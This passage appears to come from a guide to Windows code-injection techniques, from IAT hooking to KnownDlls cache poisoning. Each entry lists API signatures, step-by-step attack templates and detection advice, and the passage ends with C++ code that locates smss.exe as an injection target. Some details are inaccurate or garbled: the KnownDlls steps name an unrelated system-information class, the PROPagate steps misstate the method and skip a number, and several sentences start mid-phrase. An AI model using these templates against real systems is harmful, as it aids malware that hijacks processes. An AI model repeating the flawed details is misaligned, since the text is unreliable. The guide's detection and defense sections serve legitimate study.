- [`VirtualProtect`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
  ```c
  BOOL VirtualProtect(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flNewProtect,
    PDWORD lpflOldProtect
  );
  ```

Template:
1. Locate the IAT of the target process
2. Identify the function to be hooked
3. Change the memory protection of the IAT to writable using `VirtualProtect`
4. Replace the original function address with the address of the malicious function
- Calculate the address of the IAT entry for the target function
- Read the original function address from the IAT entry
- Replace the original function address with the address of the malicious function
5. Restore the original memory protection

Detection and Defense:
- Implement IAT integrity checks to detect modifications
- Use EDR solutions with capabilities to detect IAT hooking
- Employ runtime analysis to identify unexpected function redirections
- Implement code signing and verification mechanisms for loaded modules

## 16. Inline Hooking

This technique modifies the first few instructions of a function to redirect execution to malicious code. requires careful handling of multi-byte instructions and relative jumps. 

Key APIs:
- `VirtualProtect` (see above)
- [`memcpy`](https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/memcpy-wmemcpy)
  ```c
  void *memcpy(
    void *dest,
    const void *src,
    size_t count
  );
  ```

Template:
1. Locate the target function in memory
2. Change the memory protection to writable using `VirtualProtect`
3. Save the original instructions (usually 5 or more bytes)
4. Overwrite the beginning of the function with a jump to the malicious code
5. In the malicious code, execute the saved original instructions and then jump back to the original function

Detection and Defense:
- Implement function integrity checks to detect modifications to function prologues
- Use EDR solutions with capabilities to detect inline hooking
- Employ runtime analysis to identify unexpected changes in function execution flow
- Implement code signing and verification mechanisms for loaded modules

## 17. Debugger Injection

This technique uses debugging APIs to inject code into a target process. can be detected by anti-debugging checks in the target process.

Key APIs:
- [`DebugActiveProcess`](https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-debugactiveprocess)
  ```c
  BOOL DebugActiveProcess(
    DWORD dwProcessId
  );
  ```
- [`WaitForDebugEvent`](https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-waitfordebugevent)
  ```c
  BOOL WaitForDebugEvent(
    LPDEBUG_EVENT lpDebugEvent,
    DWORD         dwMilliseconds
  );
  ```
- [`ContinueDebugEvent`](https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-continuedebugevent)
  ```c
  BOOL ContinueDebugEvent(
    DWORD dwProcessId,
    DWORD dwThreadId,
    DWORD dwContinueStatus
  );
  ```

Template:
1. Attach to the target process as a debugger using `DebugActiveProcess`
2. Wait for debug events with `WaitForDebugEvent`
3. When a suitable event occurs, inject the malicious code using `WriteProcessMemory`
4. Modify the thread context to execute the injected code
5. Continue the debug event with `ContinueDebugEvent`

Detection and Defense:
- Implement anti-debugging techniques in sensitive applications
- Monitor for suspicious use of debugging APIs
- Use EDR solutions with capabilities to detect debugger-based injection
- Employ runtime analysis to identify unexpected debugging events

## 18. COM Hijacking

This technique involves replacing legitimate COM objects with malicious ones to execute code when the COM object is instantiated. used for persistence, not just for injection.

Key APIs:
- [`CoCreateInstance`](https://docs.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance)
  ```c
  HRESULT CoCreateInstance(
    REFCLSID rclsid,
    LPUNKNOWN pUnkOuter,
    DWORD dwClsContext,
    REFIID riid,
    LPVOID *ppv
  );
  ```
- [`RegOverridePredefKey`](https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regoverridepredefkey)
  ```c
  LSTATUS RegOverridePredefKey(
    HKEY hKey,
    HKEY hNewHKey
  );
  ```

Template:
1. Create a malicious COM object
2. Modify the registry to replace the CLSID of a legitimate COM object with the malicious one
3. When the application calls `CoCreateInstance`, the malicious object will be instantiated instead

Detection and Defense:
- Implement COM object integrity checks
- Monitor for suspicious registry modifications related to COM objects
- Use application whitelisting to prevent unauthorized COM objects from loading
- Employ behavior-based detection to identify unexpected COM object instantiation

## 19. Phantom DLL Hollowing

This technique involves creating a new section in a legitimate DLL and injecting code into it.

Key APIs:
- [`LoadLibraryEx`](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryexa)
  ```c
  HMODULE LoadLibraryExA(
    LPCSTR lpLibFileName,
    HANDLE hFile,
    DWORD  dwFlags
  );
  ```
- [`VirtualAlloc`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
  ```c
  LPVOID VirtualAlloc(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
  );
  ```
- [`VirtualProtect`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
  ```c
  BOOL VirtualProtect(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flNewProtect,
    PDWORD lpflOldProtect
  );
  ```

Template:
1. Load a legitimate DLL using `LoadLibraryEx` with `DONT_RESOLVE_DLL_REFERENCES` flag
2. Allocate a new memory section using `VirtualAlloc`
3. Copy the malicious code to the new section
4. Modify the DLL's PE headers to include the new section
5. Change the memory protection of the new section using `VirtualProtect`
6. Execute the injected code

Detection and Defense:
- Implement DLL integrity checks to detect modifications
- Monitor for suspicious patterns of DLL loading and memory allocation
- Use EDR solutions with capabilities to detect phantom DLL hollowing
- Employ memory forensics tools to identify signs of DLL manipulation

## 20. PROPagate

This technique abuses the SetProp/GetProp Windows API functions to achieve code execution.

Key APIs:
- [`SetProp`](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setpropa)
  ```c
  BOOL SetPropA(
    HWND   hWnd,
    LPCSTR lpString,
    HANDLE hData
  );
  ```
- [`GetProp`](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getpropa)
  ```c
  HANDLE GetPropA(
    HWND   hWnd,
    LPCSTR lpString
  );
  ```
- [`EnumPropsEx`](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-enumpropsexw)
  ```c
  int EnumPropsExW(
    HWND          hWnd,
    PROPENUMPROCEXW lpEnumFunc,
    LPARAM        lParam
  );
  ```

Template:
1. Find a target window using `FindWindow` or `EnumWindows`
2. Allocate memory for the payload using `VirtualAllocEx`
3. Write the payload to the allocated memory using `WriteProcessMemory`
4. Use `SetProp` to set a property on the window, with the payload address as the property value
- Create a custom window procedure that executes the payload
- Use `SetWindowLongPtr` to replace the original window procedure with the custom one
6. Trigger the execution by causing the window to enumerate its properties (e.g., by sending a message that causes a redraw)

Detection and Defense:
- Monitor for suspicious modifications to window properties
- Implement integrity checks for window properties
- Use EDR solutions with capabilities to detect PROPagate techniques
- Employ behavior-based detection to identify processes with unexpected changes in window properties

## 21. Early Bird Injection

This technique injects code into a process during its initialization, before the main thread starts executing.

Key APIs:
- [`CreateProcess`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
  ```c
  BOOL CreateProcessA(
    LPCSTR                lpApplicationName,
    LPSTR                 lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL                  bInheritHandles,
    DWORD                 dwCreationFlags,
    LPVOID                lpEnvironment,
    LPCSTR                lpCurrentDirectory,
    LPSTARTUPINFOA        lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
  );
  ```
- `VirtualAllocEx` (see above)
- `WriteProcessMemory` (see above)
- `QueueUserAPC` (see above)
- `ResumeThread` (see above)

Template:
1. Create a new process in suspended state using `CreateProcess` with `CREATE_SUSPENDED` flag
2. Allocate memory in the new process using `VirtualAllocEx`
3. Write the payload to the allocated memory using `WriteProcessMemory`
4. Queue an APC to the main thread using `QueueUserAPC`, pointing to the payload
5. Resume the main thread using `ResumeThread`

Detection and Defense:
- Monitor for process creation with the `CREATE_SUSPENDED` flag
- Implement process initialization monitoring to detect unexpected code execution
- Use EDR solutions with capabilities to detect Early Bird injection techniques
- Employ behavior-based detection to identify processes with abnormal initialization patterns

## 22. Shim-based Injection

This technique leverages the Windows Application Compatibility framework to inject code.

Key APIs:
- [`SdbCreateDatabase`](https://docs.microsoft.com/en-us/windows/win32/api/appcompatapi/nf-appcompatapi-sdbcreatedatabase)
  ```c
  PDB SdbCreateDatabase(
    LPCWSTR pwszPath
  );
  ```
- [`SdbWriteDWORDTag`](https://docs.microsoft.com/en-us/windows/win32/api/appcompatapi/nf-appcompatapi-sdbwritedwordtag)
  ```c
  BOOL SdbWriteDWORDTag(
    PDB  pdb,
    TAG  tTag,
    DWORD dwData
  );
  ```
- [`SdbEndWriteListTag`](https://docs.microsoft.com/en-us/windows/win32/api/appcompatapi/nf-appcompatapi-sdbendwritelisttag)
  ```c
  BOOL SdbEndWriteListTag(
    PDB pdb,
    TAG tTag
  );
  ```

Template:
1. Create a shim database using `SdbCreateDatabase`
2. Write shim data to the database, including the payload and target application
3. Install the shim database using `sdbinst.exe`
4. The payload will be executed when the target application is launched

Detection and Defense:
- Monitor for suspicious shim database creation and installation
- Implement application compatibility shim monitoring
- Use EDR solutions with capabilities to detect shim-based injection techniques
- Employ whitelisting for approved shims and block unauthorized shim installations

## 23. Mapping Injection

This technique uses memory-mapped files to inject code into a remote process.

Key APIs:
- [`CreateFileMapping`](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga)
  ```c
  HANDLE CreateFileMappingA(
    HANDLE                hFile,
    LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
    DWORD                 flProtect,
    DWORD                 dwMaximumSizeHigh,
    DWORD                 dwMaximumSizeLow,
    LPCSTR                lpName
  );
  ```
- [`MapViewOfFile`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile)
  ```c
  LPVOID MapViewOfFile(
    HANDLE hFileMappingObject,
    DWORD  dwDesiredAccess,
    DWORD  dwFileOffsetHigh,
    DWORD  dwFileOffsetLow,
    SIZE_T dwNumberOfBytesToMap
  );
  ```
- `NtMapViewOfSection` (Undocumented)
  ```c
  NTSTATUS NTAPI NtMapViewOfSection(
    HANDLE          SectionHandle,
    HANDLE          ProcessHandle,
    PVOID           *BaseAddress,
    ULONG_PTR       ZeroBits,
    SIZE_T          CommitSize,
    PLARGE_INTEGER  SectionOffset,
    PSIZE_T         ViewSize,
    SECTION_INHERIT InheritDisposition,
    ULONG           AllocationType,
    ULONG           Win32Protect
  );
  ```

Template:
1. Create a file mapping object using `CreateFileMapping`
2. Map a view of the file into the current process using `MapViewOfFile`
3. Write the payload to the mapped view
4. Use `NtMapViewOfSection` to map the view into the target process
5. Execute the payload in the target process

Detection and Defense:
- Monitor for suspicious patterns of file mapping and view creation
- Implement memory mapping monitoring to detect unexpected shared memory usage
- Use EDR solutions with capabilities to detect mapping injection techniques
- Employ behavior-based detection to identify processes with abnormal memory-mapped file usage

## 24. KnownDlls Cache Poisoning

This technique involves replacing a legitimate DLL in the KnownDlls cache with a malicious one.

Key APIs:
- [`NtSetSystemInformation`](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntsetsysteminformation) (Undocumented)
  ```c
  NTSTATUS NTAPI NtSetSystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID                    SystemInformation,
    ULONG                    SystemInformationLength
  );
  ```

Template:
1. Create a malicious DLL with the same name as a legitimate KnownDlls entry
2. Create a Section object for the malicious DLL:
	- Use NtCreateSection to create a section object
	- Map a view of the section into memory
	- Write the malicious DLL content to the mapped view
3. Use `NtSetSystemInformation` with `SystemExtendServiceTableInformation` to add the malicious DLL to the KnownDlls cache
4. The malicious DLL will be loaded instead of the legitimate one by processes

Detection and Defense:
- Implement KnownDlls integrity checks
- Monitor for modifications to the KnownDlls cache
- Use EDR solutions with capabilities to detect KnownDlls cache poisoning
- Employ whitelisting and code signing verification for DLLs in the KnownDlls cache

## Additional Considerations for Detection and Defense

1. Implement a robust Application Whitelisting strategy to prevent unauthorized executables and DLLs from running.
2. Use Windows Defender Exploit Guard or similar technologies to enable Attack Surface Reduction (ASR) rules.
3. Keep systems and software up-to-date with the latest security patches.
4. Utilize User Account Control (UAC) and principle of least privilege to limit the impact of successful injections.
5. Implement Network Segmentation to limit lateral movement in case of a successful attack.
6. Use Runtime Application Self-Protection (RASP) technologies to detect and prevent injection attempts in real-time.
7. Regularly perform threat hunting activities to proactively search for signs of injection techniques.
8. Implement and maintain a robust Security Information and Event Management (SIEM) system to correlate and analyze security events.
9. Conduct regular security awareness training for users to recognize and report suspicious activities.
10. Perform regular penetration testing and red team exercises to identify vulnerabilities and improve defenses against injection techniques.

## Process Enumeration

```c
#include <stdio.h>
#include <Windows.h>
#include <tlhelp32.h>
#include <errhandlingapi.h> // GetLastError
#include <heapapi.h> // HeapCreate, HeapAlloc, HeapDestroy
#include <strsafe.h> // StringCchPrintf
#include <assert.h>
#include <tchar.h>

void ErrorExit(LPCTSTR lpszFunction);
int ProcessEnumerateAndSearch(const wchar_t* ProcessName, PROCESSENTRY32* lppe);
int PrintProcessInfo(const PROCESSENTRY32* lppe);

int PrintProcessInfo(const PROCESSENTRY32* lppe)
{
    assert(lppe);

    wprintf(L"PROCESS : %ls\n", lppe->szExeFile);

    int PID = static_cast<int>(lppe->th32ProcessID);
    if (PID == 0) {
        wprintf(L"ERR : Process Not Found.\n");
        return 0;
    }

    wprintf(L"PID : %i\n\n", PID);
    return 1;
}

void ErrorExit(LPCTSTR functionName)
{
    constexpr DWORD FLAGS = FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS;
    constexpr DWORD LANG_ID = MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT);
    constexpr size_t EXTRA_CHARS = 40;

    DWORD errorCode = GetLastError();
    LPTSTR messageBuf = nullptr;

    FormatMessage(FLAGS, NULL, errorCode, LANG_ID, (LPTSTR)&messageBuf, 0, NULL);

    if (messageBuf) {
        size_t funcNameLen = _tcslen(functionName);
        size_t messageLen = _tcslen(messageBuf);
        size_t bufSize = (funcNameLen + messageLen + EXTRA_CHARS) * sizeof(TCHAR);

        LPTSTR displayBuf = static_cast<LPTSTR>(LocalAlloc(LMEM_ZEROINIT, bufSize));
        if (displayBuf) {
            StringCchPrintf(displayBuf, LocalSize(displayBuf) / sizeof(TCHAR), TEXT("%s failed with error %d: %s"), functionName, errorCode, messageBuf);
            MessageBox(NULL, displayBuf, TEXT("Error"), MB_OK);

            LocalFree(displayBuf);
        }

        LocalFree(messageBuf);
    }

    ExitProcess(errorCode);
}

int ProcessEnumerateAndSearch(const wchar_t* ProcessName, PROCESSENTRY32* lppe)
{
    assert(ProcessName && lppe);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        ErrorExit(TEXT("CreateToolhelp32Snapshot"));

    lppe->dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, lppe) == FALSE) {
        CloseHandle(hSnapshot);
        ErrorExit(TEXT("Process32First"));
    }

    int pFoundFlag = 0;
    do {
        size_t wcProcessName = wcslen(ProcessName);
        if (wcsncmp(lppe->szExeFile, ProcessName, wcProcessName) == 0) {
            if (!PrintProcessInfo(lppe)) continue;
            pFoundFlag = 1;
            break;
        }
    } while (Process32Next(hSnapshot, lppe));

    CloseHandle(hSnapshot);

    return pFoundFlag;
}

int main(int argc, char** argv)
{
    wchar_t pName[] = L"smss.exe"; // process name we will be injecting
    PROCESSENTRY32 lppe = { 0 };

    if (ProcessEnumerateAndSearch(pName, &lppe)) {
        // do some stuff
    }
    else {
        return 1;
    }

    return 0;
}
```
